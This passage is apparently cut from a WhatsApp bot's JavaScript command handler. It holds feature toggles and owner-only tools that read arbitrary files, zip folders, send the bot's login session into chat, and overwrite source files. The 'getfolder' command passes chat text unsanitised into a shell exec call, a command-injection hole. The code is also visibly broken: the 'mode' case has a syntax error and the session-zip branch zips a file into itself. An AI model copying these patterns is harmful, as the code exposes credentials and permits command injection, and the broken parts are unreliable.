{ buttonId: `${prefix + command} on`, buttonText: { displayText: ON }, type: 1 },
{ buttonId: `${prefix + command} off`, buttonText: { displayText: OFF }, type: 1 }], setQuoted)
}
break
case "autovn":
if (m.isGroup && !isSewa) return onlySewa()
if (!isOwner && !m.key.fromMe) return onlyOwner()
if (args[0] == "on" || args[0] == "enable" || args[0] == "1") {
if (db.data.settings[botNumber].autovn == true) return setReply(mess.on)
db.data.settings[botNumber].autovn = true
setReply(mess.cmd.autovn.on)
} else if (args[0] == "off" || args[0] == "disable" || args[0] == "0") {
if (db.data.settings[botNumber].autovn == false) return setReply(mess.off)
db.data.settings[botNumber].autovn = false
setReply(mess.cmd.autovn.off)
} else {
sock.sendButMessage(m.chat, `MODE AUTO VN`, copyrightnya, [
{ buttonId: `${prefix + command} on`, buttonText: { displayText: ON }, type: 1 },
{ buttonId: `${prefix + command} off`, buttonText: { displayText: OFF }, type: 1 }], setQuoted)
}
break
case "autoquoted":
if (m.isGroup && !isSewa) return onlySewa()
if (!isOwner && !m.key.fromMe) return onlyOwner()
if (args[0] == "on" || args[0] == "enable" || args[0] == "1") {
if (db.data.settings[botNumber].autoquoted == true) return setReply(mess.on)
db.data.settings[botNumber].autoquoted = true
setReply(mess.cmd.autoquoted.on)
} else if (args[0] == "off" || args[0] == "disable" || args[0] == "0") {
if (db.data.settings[botNumber].autoquoted == false) return setReply(mess.off)
db.data.settings[botNumber].autoquoted = false
setReply(mess.cmd.autoquoted.off)
} else {
sock.sendButMessage(m.chat, `MODE AUTO QUOTED`, copyrightnya, [
{ buttonId: `${prefix + command} on`, buttonText: { displayText: ON }, type: 1 },
{ buttonId: `${prefix + command} off`, buttonText: { displayText: OFF }, type: 1 }], setQuoted)
}
break
case "autobutton":
if (m.isGroup && !isSewa) return onlySewa()
if (!isOwner && !m.key.fromMe) return onlyOwner()
if (args[0] == "on" || args[0] == "enable" || args[0] == "1") {
if (db.data.settings[botNumber].autobutton == true) return setReply(mess.on)
db.data.settings[botNumber].autobutton = true
setReply(mess.cmd.autobutton.on)
} else if (args[0] == "off" || args[0] == "disable" || args[0] == "0") {
if (db.data.settings[botNumber].autobutton == false) return setReply(mess.off)
db.data.settings[botNumber].autobutton = false
setReply(mess.cmd.autobutton.off)
} else {
sock.sendButMessage(m.chat, `MODE AUTO BUTTON`, copyrightnya, [
{ buttonId: `${prefix + command} on`, buttonText: { displayText: ON }, type: 1 },
{ buttonId: `${prefix + command} off`, buttonText: { displayText: OFF }, type: 1 }], setQuoted)
}
break
case "autojoin":
if (m.isGroup && !isSewa) return onlySewa()
if (!isOwner && !m.key.fromMe) return onlyOwner()
if (args[0] == "on" || args[0] == "enable" || args[0] == "1") {
if (db.data.settings[botNumber].autojoin == true) return setReply(mess.on)
db.data.settings[botNumber].autojoin = true
setReply(mess.cmd.autojoin.on)
} else if (args[0] == "off" || args[0] == "disable" || args[0] == "0") {
if (db.data.settings[botNumber].autojoin == false) return setReply(mess.off)
db.data.settings[botNumber].autojoin = false
setReply(mess.cmd.autojoin.off)
} else {
sock.sendButMessage(m.chat, `MODE AUTO JOIN`, copyrightnya, [
{ buttonId: `${prefix + command} on`, buttonText: { displayText: ON }, type: 1 },
{ buttonId: `${prefix + command} off`, buttonText: { displayText: OFF }, type: 1 }], setQuoted)
}
break
case "autolevel":
if (m.isGroup && !isSewa) return onlySewa()
if (!isOwner && !m.key.fromMe) return onlyOwner()
if (args[0] == "on" || args[0] == "enable" || args[0] == "1") {
if (db.data.settings[botNumber].autolevel == true) return setReply(mess.on)
db.data.settings[botNumber].autolevel = true
setReply(mess.cmd.autolevel.on)
} else if (args[0] == "off" || args[0] == "disable" || args[0] == "0") {
if (db.data.settings[botNumber].autolevel == false) return setReply(mess.off)
db.data.settings[botNumber].autolevel = false
setReply(mess.cmd.autolevel.off)
} else {
sock.sendButMessage(m.chat, `MODE AUTO LEVEL`, copyrightnya, [
{ buttonId: `${prefix + command} on`, buttonText: { displayText: ON }, type: 1 },
{ buttonId: `${prefix + command} off`, buttonText: { displayText: OFF }, type: 1 }], setQuoted)
}
break
case "autodelsampah":
if (m.isGroup && !isSewa) return onlySewa()
if (!isOwner && !m.key.fromMe) return onlyOwner()
if (args[0] == "on" || args[0] == "enable" || args[0] == "1") {
if (db.data.settings[botNumber].autodelsampah == true) return setReply(mess.on)
db.data.settings[botNumber].autodelsampah = true
setReply(mess.cmd.autodelsampah.on)
} else if (args[0] == "off" || args[0] == "disable" || args[0] == "0") {
if (db.data.settings[botNumber].autodelsampah == false) return setReply(mess.off)
db.data.settings[botNumber].autodelsampah = false
setReply(mess.cmd.autodelsampah.off)
} else {
sock.sendButMessage(m.chat, `MODE AUTO DELETE SAMPAH`, copyrightnya, [
{ buttonId: `${prefix + command} on`, buttonText: { displayText: ON }, type: 1 },
{ buttonId: `${prefix + command} off`, buttonText: { displayText: OFF }, type: 1 }], setQuoted)
}
break
case "antispam":
if (m.isGroup && !isSewa) return onlySewa()
if (!isOwner && !m.key.fromMe) return onlyOwner()
if (args[0] == "on" || args[0] == "enable" || args[0] == "1") {
if (db.data.settings[botNumber].antispam == true) return setReply(mess.on)
db.data.settings[botNumber].antispam = true
setReply(mess.cmd.antispam.on)
} else if (args[0] == "off" || args[0] == "disable" || args[0] == "0") {
if (db.data.settings[botNumber].antispam == false) return setReply(mess.off)
db.data.settings[botNumber].antispam = false
setReply(mess.cmd.antispam.off)
} else {
sock.sendButMessage(m.chat, `MODE ANTI SPAM`, copyrightnya, [
{ buttonId: `${prefix + command} on`, buttonText: { displayText: ON }, type: 1 },
{ buttonId: `${prefix + command} off`, buttonText: { displayText: OFF }, type: 1 }], setQuoted)
}
break
case "anticall":
if (m.isGroup && !isSewa) return onlySewa()
if (!isOwner && !m.key.fromMe) return onlyOwner()
if (args[0] == "on" || args[0] == "enable" || args[0] == "1") {
if (db.data.settings[botNumber].anticall == true) return setReply(mess.on)
db.data.settings[botNumber].anticall = true
setReply(mess.cmd.anticall.on)
} else if (args[0] == "off" || args[0] == "disable" || args[0] == "0") {
if (db.data.settings[botNumber].anticall == false) return setReply(mess.off)
db.data.settings[botNumber].anticall = false
setReply(mess.cmd.anticall.off)
} else {
sock.sendButMessage(m.chat, `MODE ANTI CALL`, copyrightnya, [
{ buttonId: `${prefix + command} on`, buttonText: { displayText: ON }, type: 1 },
{ buttonId: `${prefix + command} off`, buttonText: { displayText: OFF }, type: 1 }], setQuoted)
}
break
case "mode":
if (m.isGroup && !isSewa) return onlySewa()
if (!isOwner && !m.key.fromMe) return onlyOwner()
if (args[0] == "public/self") {
if (db.data.settings[botNumber].mode == "public" || db.data.settings[botNumber].mode == "group" || db.data.settings[botNumber].mode == "private") {
db.data.settings[botNumber].mode = "self"
setReply(mess.cmd.mode.self)
} else if (db.data.settings[botNumber].mode == "self") {
db.data.settings[botNumber].mode = "public"
setReply(mess.cmd.mode.public)
}
} else if (args[0] == "public/group") {
if (db.data.settings[botNumber].mode == "public" || db.data.settings[botNumber].mode == "private" || db.data.settings[botNumber].mode == "self") {
db.data.settings[botNumber].mode = "group"
setReply(mess.cmd.mode.group)
} else if (db.data.settings[botNumber].mode == "group") {
db.data.settings[botNumber].mode = "public"
setReply(mess.cmd.mode.public)
}
} else if (args[0] == "public/private") {
if (db.data.settings[botNumber].mode == "public" || db.data.settings[botNumber].mode == "group" || db.data.settings[botNumber].mode == "self") {
db.data.settings[botNumber].mode = "private"
setReply(mess.cmd.mode.private)
} else if (db.data.settings[botNumber].mode == "private") {
db.data.settings[botNumber].mode = "public"
setReply(mess.cmd.mode.public)
}
} else {
sock.sendButMessage(m.chat, `MODE PUBLIK/SELF`, copyrightnya, [
{ buttonId: `${prefix + command} public/self`, buttonText: { displayText: "𝙿𝚄𝙱𝙻𝙸𝙲/𝚂𝙴𝙻𝙵" }, type: 1 },
{ buttonId: `${prefix + command} public/group`, buttonText: { displayText: "𝙿𝚄𝙱𝙻𝙸𝙲/𝙶𝚁𝙾𝚄𝙿" }, type: 1 },
{ buttonId: `${prefix + command} public/private`, buttonText: { displayText: "𝙿𝚄𝙱𝙻𝙸𝙲/𝙿𝚁𝙸𝚅𝙰𝚃𝙴" }, type: 1 },
}
break
case "getfile":{
if (m.isGroup && !isSewa) return onlySewa()
if (!isOwner && !m.key.fromMe) return onlyOwner()
if (m.isGroup && !isDevoloper) return setReply(mess.only.chats)
if (!text.includes("./")) return setReply(mess.cmd.getfile.query(prefix, command))
setTimeout(() => {
setReply(mess.cmd.getfile.text)
}, 2000)
setTimeout(() => {
const file = fs.readFileSync(`${text}`)
sock.sendMessage(m.chat, { document: file, mimetype: "application/bin", fileName: `${path.basename(text)}` }, { quoted: setQuoted })
}, 4000)
}
break
case "getfolder":{
if (m.isGroup && !isSewa) return onlySewa()
if (!isOwner && !m.key.fromMe) return onlyOwner()
if (m.isGroup && !isDevoloper) return setReply(mess.only.chats)
if (!text.includes("./")) return setReply(mess.cmd.getfolder.query(prefix, command))
if (text.split("/")[1] == "node_modules" && !text.split("/")[1]) {
setReply(mess.cmd.getfolder.size)
} else {
setTimeout(() => {
fs.unlinkSync(`${text}.zip`)
}, 5000)
setTimeout(() => {
const file = fs.readFileSync(`${text}.zip`)
sock.sendMessage(m.chat, { document: file, mimetype: "application/bin", fileName: `${path.basename(`${text}.zip`)}` }, { quoted: setQuoted })
}, 3000)
setTimeout(() => {
setReply(mess.cmd.getfolder.text)
}, 2000)
setTimeout(() => {
let qur = `zip -r ${text}.zip ${text}`
exec(qur, (err, stdout) => {
})
}, 1000)
}
}
break
case "getsesi":{
if (m.isGroup && !isSewa) return onlySewa()
if (m.isGroup && !isDevoloper) return setReply(mess.only.chats)
if (args[0] == "jadibot") {
let files = fs.readdirSync("./ACTION/CONNECTION/JADIBOT-SESSION")
let data = files.splice("@adiwajshing", files.length - 1)
if (!data.includes(m.sender.split("@")[0])) return setReply(mess.cmd.getsesi.query)
setTimeout(() => {
fs.unlinkSync(`./ACTION/CONNECTION/JADIBOT-SESSION/${m.sender.split("@")[0]}.zip`)
}, 5000)
setTimeout(() => {
const file = fs.readFileSync(`./ACTION/CONNECTION/JADIBOT-SESSION/${m.sender.split("@")[0]}.zip`)
sock.sendMessage(m.chat, { document: file, mimetype: "application/bin", fileName: `${m.sender.split("@")[0]}.zip` }, { quoted: setQuoted })
}, 3000)
setTimeout(() => {
setReply(mess.cmd.getsesi.text)
}, 2000)
setTimeout(() => {
let qur = `zip -r ./ACTION/CONNECTION/JADIBOT-SESSION/${m.sender.split("@")[0]}.zip ./ACTION/CONNECTION/JADIBOT-SESSION/${m.sender.split("@")[0]}.zip`
exec(qur, (err, stdout) => {
})
}, 1000)
} else {
if (!isOwner && !m.key.fromMe) return onlyOwner()
setTimeout(() => {
fs.unlinkSync(`./ACTION/CONNECTION/SESSION.zip`)
}, 5000)
setTimeout(() => {
const file = fs.readFileSync(`./ACTION/CONNECTION/SESSION.zip`)
sock.sendMessage(m.chat, { document: file, mimetype: "application/bin", fileName: `session.zip` }, { quoted: setQuoted })
}, 3000)
setTimeout(() => {
setReply(mess.cmd.getsesi.text)
}, 2000)
setTimeout(() => {
let qur = `zip -r ./ACTION/CONNECTION/SESSION.zip ./ACTION/CONNECTION/SESSION`
exec(qur, (err, stdout) => {
})
}, 1000)
}
}
break
case "chat":
if (m.isGroup && !isSewa) return onlySewa()
if (!isOwner && !m.key.fromMe) return onlyOwner()
if (args[0] == "pin") {
await sock.chatModify({ pin: true }, m.chat)
} else if (args[0] == "unpin") {
await sock.chatModify({ pin: false }, m.chat)
} else if (args[0] == "archive") {
await sock.chatModify({ archive: true, lastMessages: [m] }, m.chat)
} else if (args[0] == "unarchive") {
await sock.chatModify({ archive: false, lastMessages: [m] }, m.chat)
} else if (args[0] === "mute") {
await sock.chatModify({ mute: "Infinity" }, m.chat, [])
} else if (args[0] === "unmute") {
await sock.chatModify({ mute: null }, m.chat, [])
} else if (args[0] === "read") {
await sock.chatModify({ markRead: true, lastMessages: [m] }, m.chat)
} else if (args[0] === "unread") {
await sock.chatModify({ markRead: false, lastMessages: [m] }, m.chat)
} else if (args[0] == "delete") {
await sock.chatModify({ delete: true, lastMessages: [{ key: m.key, messageTimestamp: m.messageTimestamp.low }]}, m.chat)
} else if (m.isGroup) {
const sections = [ {
title: `PLEASE SELECT`,
rows: [
{title: "PIN", rowId: `${prefix + command} pin`, description: "CHAT PIN"}, 
{title: "UNPIN", rowId: `${prefix + command} unpin`, description: "CHAT UNPIN"},
{title: "ARCHIVE", rowId: `${prefix + command} archive`, description: "CHAT ARCHIVE"},
{title: "UNARCHIVE", rowId: `${prefix + command} unarchive`, description: "CHAT UNARCHIVE"},
{title: "MUTE", rowId: `${prefix + command} mute`, description: "CHAT MUTE"},
{title: "UNMUTE", rowId: `${prefix + command} unmute`, description: "CHAT UNMUTE"},
{title: "READ", rowId: `${prefix + command} read`, description: "CHAT READ"},
{title: "UNREAD", rowId: `${prefix + command} unread`, description: "CHAT UNREAD"},
]}]
const listMessage = { text: `${command.toUpperCase()}`, buttonText: "Click Here", sections }
sock.sendMessage(m.chat, listMessage, { quoted: setQuoted })
} else if (!m.isGroup) {
const sections = [ {
title: `PLEASE SELECT`,
rows: [
{title: "PIN", rowId: `${prefix + command} pin`, description: "CHAT PIN"}, 
{title: "UNPIN", rowId: `${prefix + command} unpin`, description: "CHAT UNPIN"},
{title: "ARCHIVE", rowId: `${prefix + command} archive`, description: "CHAT ARCHIVE"},
{title: "UNARCHIVE", rowId: `${prefix + command} unarchive`, description: "CHAT UNARCHIVE"},
{title: "MUTE", rowId: `${prefix + command} mute`, description: "CHAT MUTE"},
{title: "UNMUTE", rowId: `${prefix + command} unmute`, description: "CHAT UNMUTE"},
{title: "READ", rowId: `${prefix + command} read`, description: "CHAT READ"},
{title: "UNREAD", rowId: `${prefix + command} unread`, description: "CHAT UNREAD"},
{title: "DELETE", rowId: `${prefix + command} delete`, description: "CHAT DELETE"},
]}]
const listMessage = { text: `${command.toUpperCase()}`, buttonText: "Click Here", sections }
sock.sendMessage(m.chat, listMessage, { quoted: setQuoted })
}
break
case "updatefile":{
if (m.isGroup && !isSewa) return onlySewa()
if (!isOwner && !m.key.fromMe) return onlyOwner()
if (m.isGroup && !isDevoloper) return setReply(mess.only.chats)
if (!isQuotedDocument) return setReply(mess.reply.document) 
if (!text.includes("./")) return setReply(mess.cmd.updatefile.query(prefix, command))
if (!text.includes(".js")) return setReply(mess.cmd.updatefile.query(prefix, command))
let files = fs.readdirSync(text.split(m.quoted.fileName)[0])
if (!files.includes(m.quoted.fileName)) return setReply(mess.cmd.updatefile.text) 
let media = await downloadContentFromMessage(m.quoted, m.quoted.mtype.replace(/Message/gi, ""))
let buffer = Buffer.from([])
for await(const chunk of media) {
buffer = Buffer.concat([buffer, chunk])
}
fs.writeFileSync(text, buffer)
sock.sendButMessage(m.chat, mess.success, copyrightnya, [{ buttonId: `${prefix}restart`, buttonText: { displayText: "𝚛𝚎𝚜𝚝𝚊𝚛𝚝" }, type: 1 }], setQuoted)
}
break
case "restart":
if (m.isGroup && !isSewa) return onlySewa()
if (!isOwner && !m.key.fromMe) return onlyOwner()
exec("npm start", (err, stdout) => {
return stdout
})
break
//=========================[ FITURE GROUP ]=========================\\
case "antilink":
if (m.isGroup && !isSewa) return onlySewa()
if (!m.isGroup) return onlyGroup()
if (!isBotGroupAdmins) return onlyBadmin()
if (!isGroupAdmins && !isOwner) return onlyAdmin()
if (args[0] === "on" || args[0] === "enable" || args[0] === "1") {
if (db.data.chats[m.chat].antilink == true) return setReply(mess.on)
db.data.chats[m.chat].antilink = true
setReply(mess.cmd.antilink.on)
} else if (args[0] === "off" || args[0] === "disable" || args[0] === "0") {
if (db.data.chats[m.chat].antilink == false) return setReply(mess.off)
db.data.chats[m.chat].antilink = false
setReply(mess.cmd.antilink.off)
} else {
sock.sendButMessage(m.chat, `MODE ANTI LINK`, copyrightnya, [
{ buttonId: `${prefix + command} on`, buttonText: { displayText: ON }, type: 1 },
{ buttonId: `${prefix + command} off`, buttonText: { displayText: OFF }, type: 1 }], setQuoted)
}
break
case "antilinkgc":
if (m.isGroup && !isSewa) return onlySewa()
if (!m.isGroup) return onlyGroup()
if (!isBotGroupAdmins) return onlyBadmin()
if (!isGroupAdmins && !isOwner) return onlyAdmin()
if (args[0] === "on" || args[0] === "enable" || args[0] === "1") {
if (db.data.chats[m.chat].antilinkgc == true) return setReply(mess.on)
db.data.chats[m.chat].antilinkgc = true
setReply(mess.cmd.antilinkgc.on)
} else if (args[0] === "off" || args[0] === "disable" || args[0] === "0") {
if (db.data.chats[m.chat].antilinkgc == false) return setReply(mess.off)
db.data.chats[m.chat].antilinkgc = false
setReply(mess.cmd.antilinkgc.off)
} else {
sock.sendButMessage(m.chat, `MODE ANTI LINK GROUP`, copyrightnya, [
{ buttonId: `${prefix + command} on`, buttonText: { displayText: ON }, type: 1 },
{ buttonId: `${prefix + command} off`, buttonText: { displayText: OFF }, type: 1 }], setQuoted)
}
break
case "antilinkyt":
if (m.isGroup && !isSewa) return onlySewa()
if (!m.isGroup) return onlyGroup()
if (!isBotGroupAdmins) return onlyBadmin()
if (!isGroupAdmins && !isOwner) return onlyAdmin()
if (args[0] && !args[1]) {
sock.sendButMessage(m.chat, `MODE ANTI LINK YOUTUBE ${args[0].toUpperCase()}`, copyrightnya, [
{ buttonId: `${prefix + command} ${args[0]} on`, buttonText: { displayText: ON }, type: 1 },
{ buttonId: `${prefix + command} ${args[0]} off`, buttonText: { displayText: OFF }, type: 1 }], setQuoted)
} else if (args[0] === "channel" && args[1] === "on" || args[0] === "channel" && args[1] === "enable" || args[0] === "channel" && args[1] === "1") {
if (db.data.chats[m.chat].antilinkytchannel == true) return setReply(mess.on)
db.data.chats[m.chat].antilinkytchannel = true
setReply(mess.cmd.antilinkytchannel.on)
} else if (args[0] === "channel" && args[1] === "off" || args[0] === "channel" && args[1] === "disable" || args[0] === "channel" && args[1] === "0") {
if (db.data.chats[m.chat].antilinkytchannel == false) return setReply(mess.off)
db.data.chats[m.chat].antilinkytchannel = false
setReply(mess.cmd.antilinkytchannel.off)
} else if (args[0] === "video" && args[1] === "on" || args[0] === "video" && args[1] === "enable" || args[0] === "video" && args[1] === "1") {
if (db.data.chats[m.chat].antilinkytvideo == true) return setReply(mess.on)
db.data.chats[m.chat].antilinkytvideo = true
setReply(mess.cmd.antilinkytvideo.on)
} else if (args[0] === "video" && args[1] === "off" || args[0] === "video" && args[1] === "disable" || args[0] === "video" && args[1] === "0") {
if (db.data.chats[m.chat].antilinkytvideo == false) return setReply(mess.off)
db.data.chats[m.chat].antilinkytvideo = false
setReply(mess.cmd.antilinkytvideo.off)
} else {
sock.sendButMessage(m.chat, `MODE ANTI LINK YOUTUBE`, copyrightnya, [
{ buttonId: `${prefix + command} channel`, buttonText: { displayText: "𝙲𝙷𝙰𝙽𝙽𝙴𝙻" }, type: 1 },
{ buttonId: `${prefix + command} video`, buttonText: { displayText: "𝚅𝙸𝙳𝙴𝙾" }, type: 1 }], setQuoted)
}
break
case "antilinkfb":
if (m.isGroup && !isSewa) return onlySewa()
if (!m.isGroup) return onlyGroup()
if (!isBotGroupAdmins) return onlyBadmin()
if (!isGroupAdmins && !isOwner) return onlyAdmin()
if (args[0] === "on" || args[0] === "enable" || args[0] === "1") {
if (db.data.chats[m.chat].antilinkfb == true) return setReply(mess.on)
db.data.chats[m.chat].antilinkfb = true
setReply(mess.cmd.antilinkfb.on)
} else if (args[0] === "off" || args[0] === "disable" || args[0] === "0") {
if (db.data.chats[m.chat].antilinkfb == false) return setReply(mess.off)
db.data.chats[m.chat].antilinkfb = false
setReply(mess.cmd.antilinkfb.off)
} else {
sock.sendButMessage(m.chat, `MODE ANTI LINK FACEBOOK`, copyrightnya, [
{ buttonId: `${prefix + command} on`, buttonText: { displayText: ON }, type: 1 },
{ buttonId: `${prefix + command} off`, buttonText: { displayText: OFF }, type: 1 }], setQuoted)
}
break
case "antilinkig":
if (m.isGroup && !isSewa) return onlySewa()
if (!m.isGroup) return onlyGroup()
if (!isBotGroupAdmins) return onlyBadmin()
if (!isGroupAdmins && !isOwner) return onlyAdmin()
if (args[0] === "on" || args[0] === "enable" || args[0] === "1") {
if (db.data.chats[m.chat].antilinkig == true) return setReply(mess.on)
db.data.chats[m.chat].antilinkig = true
setReply(mess.cmd.antilinkig.on)
} else if (args[0] === "off" || args[0] === "disable" || args[0] === "0") {
if (db.data.chats[m.chat].antilinkig == false) return setReply(mess.off)
db.data.chats[m.chat].antilinkig = false
setReply(mess.cmd.antilinkig.off)
} else {
sock.sendButMessage(m.chat, `MODE ANTI LINK INSTAGRAM`, copyrightnya, [
{ buttonId: `${prefix + command} on`, buttonText: { displayText: ON }, type: 1 },
{ buttonId: `${prefix + command} off`, buttonText: { displayText: OFF }, type: 1 }], setQuoted)
}
break
case "antilinktele":
if (m.isGroup && !isSewa) return onlySewa()
if (!m.isGroup) return onlyGroup()
if (!isBotGroupAdmins) return onlyBadmin()
if (!isGroupAdmins && !isOwner) return onlyAdmin()
if (args[0] === "on" || args[0] === "enable" || args[0] === "1") {
if (db.data.chats[m.chat].antilinktele == true) return setReply(mess.on)
db.data.chats[m.chat].antilinktele = true
setReply(mess.cmd.antilinktele.on)
} else if (args[0] === "off" || args[0] === "disable" || args[0] === "0") {
if (db.data.chats[m.chat].antilinktele == false) return setReply(mess.off)
db.data.chats[m.chat].antilinktele = false
setReply(mess.cmd.antilinktele.off)
} else {
sock.sendButMessage(m.chat, `MODE ANTI LINK TELEGRAM`, copyrightnya, [
{ buttonId: `${prefix + command} on`, buttonText: { displayText: ON }, type: 1 },
{ buttonId: `${prefix + command} off`, buttonText: { displayText: OFF }, type: 1 }], setQuoted)
}
break
case "antilinkwa":
if (m.isGroup && !isSewa) return onlySewa()
if (!m.isGroup) return onlyGroup()
if (!isBotGroupAdmins) return onlyBadmin()
if (!isGroupAdmins && !isOwner) return onlyAdmin()
if (args[0] === "on" || args[0] === "enable" || args[0] === "1") {
if (db.data.chats[m.chat].antilinkwa == true) return setReply(mess.on)
db.data.chats[m.chat].antilinkwa = true
setReply(mess.cmd.antilinkwa.on)
} else if (args[0] === "off" || args[0] === "disable" || args[0] === "0") {
if (db.data.chats[m.chat].antilinkwa == false) return setReply(mess.off)
db.data.chats[m.chat].antilinkwa = false
setReply(mess.cmd.antilinkwa.off)
} else {
sock.sendButMessage(m.chat, `MODE ANTI LINK WHATSAPP`, copyrightnya, [
{ buttonId: `${prefix + command} on`, buttonText: { displayText: ON }, type: 1 },
{ buttonId: `${prefix + command} off`, buttonText: { displayText: OFF }, type: 1 }], setQuoted)
}
break
case "antilinktiktok":
if (m.isGroup && !isSewa) return onlySewa()
if (!m.isGroup) return onlyGroup()
if (!isBotGroupAdmins) return onlyBadmin()
if (!isGroupAdmins && !isOwner) return onlyAdmin()
if (args[0] === "on" || args[0] === "enable" || args[0] === "1") {
if (db.data.chats[m.chat].antilinktiktok == true) return setReply(mess.on)
db.data.chats[m.chat].antilinktiktok = true
setReply(mess.cmd.antilinktiktok.on)
} else if (args[0] === "off" || args[0] === "disable" || args[0] === "0") {
if (db.data.chats[m.chat].antilinktiktok == false) return setReply(mess.off)
db.data.chats[m.chat].antilinktiktok = false
setReply(mess.cmd.antilinktiktok.off)
} else {
sock.sendButMessage(m.chat, `MODE ANTI LINK TIKTOK`, copyrightnya, [
{ buttonId: `${prefix + command} on`, buttonText: { displayText: ON }, type: 1 },
{ buttonId: `${prefix + command} off`, buttonText: { displayText: OFF }, type: 1 }], setQuoted)
}
break
case "antilinktwitter":
if (m.isGroup && !isSewa) return onlySewa()
if (!m.isGroup) return onlyGroup()
if (!isBotGroupAdmins) return onlyBadmin()
if (!isGroupAdmins && !isOwner) return onlyAdmin()
if (args[0] === "on" || args[0] === "enable" || args[0] === "1") {
if (db.data.chats[m.chat].antilinktwitter == true) return setReply(mess.on)
db.data.chats[m.chat].antilinktwitter = true
setReply(mess.cmd.antilinktwitter.on)
} else if (args[0] === "off" || args[0] === "disable" || args[0] === "0") {
if (db.data.chats[m.chat].antilinktwitter == false) return setReply(mess.off)
db.data.chats[m.chat].antilinktwitter = false
setReply(mess.cmd.antilinktwitter.off)
} else {
sock.sendButMessage(m.chat, `MODE ANTI LINK TWITTER`, copyrightnya, [
{ buttonId: `${prefix + command} on`, buttonText: { displayText: ON }, type: 1 },
{ buttonId: `${prefix + command} off`, buttonText: { displayText: OFF }, type: 1 }], setQuoted)
}
break
case "antivirtex":
if (m.isGroup && !isSewa) return onlySewa()
if (!m.isGroup) return onlyGroup()
if (!isBotGroupAdmins) return onlyBadmin()
if (!isGroupAdmins && !isOwner) return onlyAdmin()
if (args[0] === "on" || args[0] === "enable" || args[0] === "1") {
if (db.data.chats[m.chat].antivirtex == true) return setReply(mess.on)
db.data.chats[m.chat].antivirtex = true
setReply(mess.cmd.antivirtex.on)
} else if (args[0] === "off" || args[0] === "disable" || args[0] === "0") {
if (db.data.chats[m.chat].antivirtex == false) return setReply(mess.off)
db.data.chats[m.chat].antivirtex = false
setReply(mess.cmd.antivirtex.off)
} else {
sock.sendButMessage(m.chat, `MODE ANTI VIRTEX`, copyrightnya, [
{ buttonId: `${prefix + command} on`, buttonText: { displayText: ON }, type: 1 },
{ buttonId: `${prefix + command} off`, buttonText: { displayText: OFF }, type: 1 }], setQuoted)
}
break
case "antiasing":
if (m.isGroup && !isSewa) return onlySewa()
if (!m.isGroup) return onlyGroup()
if (!isBotGroupAdmins) return onlyBadmin()
if (!isGroupAdmins && !isOwner) return onlyAdmin()
if (args[0] === "on" || args[0] === "enable" || args[0] === "1") {
if (db.data.chats[m.chat].antiasing == true) return setReply(mess.on)
db.data.chats[m.chat].antiasing = true
setReply(mess.cmd.antiasing.on)
} else if (args[0] === "off" || args[0] === "disable" || args[0] === "0") {
if (db.data.chats[m.chat].antiasing == false) return setReply(mess.off)
db.data.chats[m.chat].antiasing = false
setReply(mess.cmd.antiasing.off)
} else {
sock.sendButMessage(m.chat, `MODE ANTI ASING`, copyrightnya, [
{ buttonId: `${prefix + command} on`, buttonText: { displayText: ON }, type: 1 },
{ buttonId: `${prefix + command} off`, buttonText: { displayText: OFF }, type: 1 }], setQuoted)
}
break
case "antitag":
if (m.isGroup && !isSewa) return onlySewa()
if (!m.isGroup) return onlyGroup()
if (!isBotGroupAdmins) return onlyBadmin()
if (!isGroupAdmins && !isOwner) return onlyAdmin()
if (args[0] === "on" || args[0] === "enable" || args[0] === "1") {
if (db.data.chats[m.chat].antitag == true) return setReply(mess.on)
db.data.chats[m.chat].antitag = true
setReply(mess.cmd.antitag.on)
} else if (args[0] === "off" || args[0] === "disable" || args[0] === "0") {
if (db.data.chats[m.chat].antitag == false) return setReply(mess.off)
db.data.chats[m.chat].antitag = false
setReply(mess.cmd.antitag.off)
} else {
sock.sendButMessage(m.chat, `MODE ANTI TAG`, copyrightnya, [
{ buttonId: `${prefix + command} on`, buttonText: { displayText: ON }, type: 1 },
{ buttonId: `${prefix + command} off`, buttonText: { displayText: OFF }, type: 1 }], setQuoted)
}
break
case "antidelete":
if (m.isGroup && !isSewa) return onlySewa()
if (!m.isGroup) return onlyGroup()
if (!isBotGroupAdmins) return onlyBadmin()
if (!isGroupAdmins && !isOwner) return onlyAdmin()
if (args[0] === "on" || args[0] === "enable" || args[0] === "1") {
if (db.data.chats[m.chat].antidelete == true) return setReply(mess.on)
db.data.chats[m.chat].antidelete = true
setReply(mess.cmd.antidelete.on)
} else if (args[0] === "off" || args[0] === "disable" || args[0] === "0") {
if (db.data.chats[m.chat].antidelete == false) return setReply(mess.off)
db.data.chats[m.chat].antidelete = false
setReply(mess.cmd.antidelete.off)
} else {
sock.sendButMessage(m.chat, `MODE ANTI DELETE`, copyrightnya, [
{ buttonId: `${prefix + command} on`, buttonText: { displayText: ON }, type: 1 },
{ buttonId: `${prefix + command} off`, buttonText: { displayText: OFF }, type: 1 }], setQuoted)
}
break
case "antiviewonce":
if (m.isGroup && !isSewa) return onlySewa()
if (!m.isGroup) return onlyGroup()
if (!isBotGroupAdmins) return onlyBadmin()
if (!isGroupAdmins && !isOwner) return onlyAdmin()
if (args[0] === "on" || args[0] === "enable" || args[0] === "1") {
if (db.data.chats[m.chat].antiviewonce == true) return setReply(mess.on)
db.data.chats[m.chat].antiviewonce = true
setReply(mess.cmd.antiviewonce.on)
} else if (args[0] === "off" || args[0] === "disable" || args[0] === "0") {
if (db.data.chats[m.chat].antiviewonce == false) return setReply(mess.off)
db.data.chats[m.chat].antiviewonce = false
setReply(mess.cmd.antiviewonce.off)
} else {
sock.sendButMessage(m.chat, `MODE ANTI VIEW ONCE`, copyrightnya, [
{ buttonId: `${prefix + command} on`, buttonText: { displayText: ON }, type: 1 },
{ buttonId: `${prefix + command} off`, buttonText: { displayText: OFF }, type: 1 }], setQuoted)
}
break
case "antitoxic":
if (m.isGroup && !isSewa) return onlySewa()
if (!m.isGroup) return onlyGroup()
if (!isBotGroupAdmins) return onlyBadmin()
if (!isGroupAdmins && !isOwner) return onlyAdmin()
if (args[0] === "on" || args[0] === "enable" || args[0] === "1") {
if (db.data.chats[m.chat].antitoxic == true) return setReply(mess.on)
db.data.chats[m.chat].antitoxic = true
setReply(mess.cmd.antitoxic.on)
} else if (args[0] === "off" || args[0] === "disable" || args[0] === "0") {
if (db.data.chats[m.chat].antitoxic == false) return setReply(mess.off)
db.data.chats[m.chat].antitoxic = false
setReply(mess.cmd.antitoxic.off)
} else {
sock.sendButMessage(m.chat, `MODE ANTI TOXIC`, copyrightnya, [
{ buttonId: `${prefix + command} on`, buttonText: { displayText: ON }, type: 1 },
